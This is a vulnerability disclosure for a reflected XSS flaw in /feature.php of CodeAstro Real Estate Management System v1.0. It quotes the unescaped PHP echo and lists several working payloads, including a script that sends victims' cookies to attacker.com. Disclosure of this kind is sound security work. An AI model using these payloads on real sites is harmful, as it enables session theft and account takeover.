# XSS in CodeAstro Real Estate Management System v1.0 of file /feature.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /feature.php

**Version**

- V1.0

### POC 

```
http://www.realestate1.top/feature.php?msg=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
```

![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508171619838.png)

### Reflected XSS Vulnerability

**Vulnerable Code:**
Lines 94–96:

```php path=feature.php mode=EXCERPT
<?php 
if(isset($_GET['msg']))	
    echo $_GET['msg'];	
?>
```

**Description:**
The GET parameter `msg` is echoed directly into the page without any sanitization or escaping, resulting in a critical reflected XSS vulnerability.

**HTTP Request to Trigger the Vulnerability:**

```http
GET /feature.php?msg=<script>alert('XSS')</script> HTTP/1.1
Host: target.com
Cookie: PHPSESSID=valid_session_id
```

**Advanced XSS Payload:**

```http
GET /feature.php?msg=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script> HTTP/1.1
Host: target.com
Cookie: PHPSESSID=valid_session_id
```

**URL-Encoded Bypass Payload:**

```http
GET /feature.php?msg=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1
Host: target.com
Cookie: PHPSESSID=valid_session_id
```

**Additional XSS Vectors:**

```http
GET /feature.php?msg=<img src=x onerror=alert('XSS')> HTTP/1.1
Host: target.com
Cookie: PHPSESSID=valid_session_id
```

```http
GET /feature.php?msg=<svg onload=alert('XSS')> HTTP/1.1
Host: target.com
Cookie: PHPSESSID=valid_session_id
```

```http
GET /feature.php?msg=<iframe src=javascript:alert('XSS')></iframe> HTTP/1.1
Host: target.com
Cookie: PHPSESSID=valid_session_id
```
